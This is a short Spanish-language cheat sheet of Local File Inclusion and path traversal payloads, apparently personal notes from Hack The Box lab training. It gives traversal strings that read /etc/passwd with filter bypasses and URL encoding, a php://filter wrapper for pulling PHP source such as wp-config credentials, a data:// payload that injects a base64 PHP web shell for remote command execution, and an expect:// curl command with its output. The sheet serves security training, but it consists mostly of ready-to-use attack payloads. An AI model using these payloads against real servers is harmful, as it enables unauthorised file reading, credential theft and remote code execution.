# LFI & Path Traversal

## LFI
- [Paylaods Fuzzing](https://raw.githubusercontent.com/emadshanab/LFI-Payload-List/master/LFI%20payloads.txt)
- Ejemplo para bypassear filtros: `....//....//....//....//etc/passwd`
- Encodearlo en URL también sirve: `%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64`

## como poder ver archivos mediante path traversal con PHP wrappers
- `php://filter/read=convert.base64-encode/resource=ARCHIVO-PHP`
- Con esto podriamos ver una clave en texto plano en un wordpress, en el wp-config por ejemplo, el phpinfo, etc.

## Ejemplo de RCE
- `echo '<?php system($_GET["cmd"]); ?>' | base64`
- `http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id`

## Expect PHP Wrapper
- Este wrapper permite correr comandos directo desde URL parecido a las web shells
```bash
GNT@htb[/htb]$ curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```